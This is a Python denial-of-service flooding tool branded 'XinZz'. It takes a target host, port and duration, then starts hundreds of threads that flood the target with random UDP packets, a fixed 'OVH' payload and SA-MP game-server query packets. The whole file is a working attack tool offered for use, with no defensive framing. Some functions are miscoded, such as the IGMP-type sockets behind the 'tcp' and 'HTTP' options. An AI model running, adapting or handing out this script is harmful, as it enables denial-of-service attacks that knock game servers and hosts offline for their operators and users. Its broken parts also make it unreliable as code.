import socket, struct, codecs, sys, threading, random, time, os

method = str(sys.argv[1])
ip = str(sys.argv[2])
port = int(sys.argv[3])
timer = int(sys.argv[4])

# Converting domain to ip, ex : jg-gta.com > 198.x.x.x
host = socket.gethostbyname(ip)
sys.stdout.write(f"\x1b]2;XinZz Attacking To {host} {port}\x07")
os.system('cls' if os.name == 'nt' else 'clear')
print(f"XinZz Attack To Ip {host} Port {port}")
time.sleep(1)
print(f"XinZz Attack To Ip {host} Port {port}")
time.sleep(1)
print(f"XinZz Attack To Ip {host} Port {port}")



def ovh(host, port, timer):
	payload = b"\x00\x02\x00\x2f"
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	while time.time() < timeout:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	sys.exit()

def udp(host, port, timer):
	payload = random._urandom(615)
	payloads = random._urandom(666)
	pack = random._urandom(1024)
	packs = random._urandom(1025)
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while time.time() < timeout:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payloads, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payloads, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
	sys.exit()

def tcp(host, port, timer):
	packs = random._urandom(4096)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
	sys.exit()

def bimzzxflooder(host, port, timer):
	packs = random._urandom(65500)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
	sys.exit()

def sampdos(host, port, timer):
	Attack = [
	codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
	codecs.decode('081e62da', 'hex_codec'),
	codecs.decode('081e77da', 'hex_codec'),
	codecs.decode('081e4dda', 'hex_codec'),
	codecs.decode('021efd40', 'hex_codec'),
	codecs.decode('081e7eda', 'hex_codec')]
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while time.time() < timeout:
		data = os.urandom(min(666, 999, 1024, 1025, 615))
		packets = random._urandom(1025)
		packet = random._urandom(1024)
		pack = random._urandom(615)
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packet, (host, int(port)))
		sock.sendto(packets, (host, int(port)))
		if int(port) == 7777:
			sock.sendto(Attack[5], (host, int(port)))
		elif int(port) == 7796:
			sock.sendto(Attack[4], (host, int(port)))
		elif int(port) == 7771:
			sock.sendto(Attack[6], (host, int(port)))
		elif int(port) == 7784:
			sock.sendto(Attack[7], (host, int(port)))
	sys.exit()


for _x in range(456):
	if method == "UDP" or method == "udp":
		threading.Thread(target=udp, args=(host, port, timer)).start()
	elif method == "OVH" or method == "ovh":
		threading.Thread(target=ovh, args=(host, port, timer)).start()
	elif method == "CFB" or method == "cfb":
		threading.Thread(target=bimzzxflooder, args=(host, port, timer)).start()
	elif method == "HTTP" or method == "http":
		threading.Thread(target=bimzzxflooder, args=(host, port, timer)).start()
	elif method == "TCP" or method == "tcp":
		threading.Thread(target=tcp, args=(host, port, timer)).start()
	elif method == "SAMPDOS" or method == "sampdos":
		threading.Thread(target=sampdos, args=(host, port, timer)).start()